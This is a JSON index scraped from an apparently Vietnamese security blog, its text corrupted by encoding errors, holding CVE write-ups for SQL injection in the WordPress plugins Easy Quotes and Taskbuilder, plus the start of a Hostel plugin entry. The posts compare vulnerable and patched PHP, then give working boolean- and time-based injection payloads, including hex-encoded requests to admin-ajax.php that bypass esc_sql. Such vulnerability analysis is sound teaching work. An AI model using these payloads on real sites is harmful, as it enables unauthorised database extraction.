d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o 